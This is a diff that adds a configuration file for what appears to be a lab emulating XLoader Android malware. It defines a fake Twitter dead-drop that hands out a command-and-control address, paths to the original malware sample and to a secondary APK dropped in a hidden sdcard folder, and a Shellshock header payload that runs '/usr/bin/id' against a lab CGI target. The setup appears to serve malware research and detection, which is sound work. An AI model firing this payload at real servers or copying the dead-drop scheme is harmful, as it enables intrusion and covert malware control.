@@ -1,0 +1,40 @@
+[network]
+twitter_host = "10.230.31.11"
+c2_host = "1.162.98.240"
+webview_host = "10.230.31.20"
+vulnerable_target_host = "10.230.31.30"
+dns_port = 53
+twitter_https_port = 443
+http_port = 80
+c2_port = 28833
+
+[twitter]
+c2_account = "sdfghuio342"
+webview_account = "fdgoer343"
+c2_value = "1.162.98.240:28833"
+webview_value = "http://webview.lab/"
+certificate = "certs/twitter/twitter.crt"
+private_key = "certs/twitter/twitter.key"
+tls_keylog = "captures/tls-keys.log"
+
+[scenario]
+secondary_package = "lab.xloader.secondary"
+secondary_apk = "android/secondary_apk/dist/lab-xloader-secondary.apk"
+shellshock_url = "http://vuln.lab/cgi-bin/status"
+shellshock_method = "GET"
+shellshock_user_agent = "() { :;}; echo; /usr/bin/id"
+shellshock_body = "uid=1000(cgi) gid=1000(cgi) groups=1000(cgi)"
+operator_gate = true
+wait_for_apk_seconds = 300
+wait_for_http_seconds = 60
+wait_for_operator_seconds = 900
+
+[android]
+api_level = 22
+original_package = "ufD.wykyx.vlhvh"
+original_activity = "ufD.zxYxw.itxkRujzmzjP"
+original_apk = "samples/original/xloader.apk"
+downloaded_apk = "/sdcard/.update2/lab.xloader.secondary.apk"
+
+[logging]
+directory = "logs"
